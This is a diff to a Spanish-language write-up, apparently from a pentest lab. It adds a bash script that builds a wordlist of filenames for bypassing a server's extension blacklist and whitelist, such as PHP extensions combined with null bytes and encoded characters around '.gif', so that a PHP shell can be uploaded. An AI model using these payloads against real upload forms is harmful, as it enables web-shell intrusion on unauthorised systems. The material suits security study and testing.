@@ -65,3 +65,16 @@ No hay ninguna extensión web adicional que esté incluida en la whitelist.
 Sabemos que el servidor está validando extensiones a través de una blacklist, que contiene bastantes tipos de extension `.php`, en este caso, el servidor contesta con el mensaje `Extension not allowed`.
 Cuando la validación se realiza a través de la whitelist, el servidor responde `Only images are allowed`.
 
+Realizaremos un fuzzing de extensiones, con una custom wordlist que contiene distintos payloads para baypasear tanto whitelist como blacklist, utilizamos el siguiente script para realizar la wordlist:
+```bash
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':' ';'; do
+    for ext in '.php' '.phps' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
+        echo "shell$char$ext.gif" >> wordlist.txt
+        echo "shell$ext$char.gif" >> wordlist.txt
+        echo "shell.gif$char$ext" >> wordlist.txt
+        echo "shell.gif$ext$char" >> wordlist.txt
+    done
+done
+```
+
+
